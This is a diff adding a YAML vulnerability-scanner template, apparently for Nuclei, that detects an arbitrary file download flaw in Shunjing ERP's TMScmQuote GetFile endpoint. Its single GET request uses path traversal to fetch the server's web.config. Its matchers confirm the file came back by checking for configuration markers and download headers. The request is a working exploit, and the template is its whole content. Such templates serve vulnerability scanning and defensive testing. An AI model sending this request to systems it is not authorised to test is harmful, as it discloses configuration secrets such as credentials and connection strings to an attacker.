@@ -1,0 +1,31 @@
+id: poc-centersoft-tmscmquote-anyfile-download
+info:
+  name: 顺景ERP TMScmQuote 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    顺景ERP TMScmQuote contains a vulnerability allowing arbitrary file download. Exploitation can lead to sensitive file disclosure.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<configuration>"
+          - "system.web"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
+      - type: word
+        part: header
+        words:
+          - "web.config"
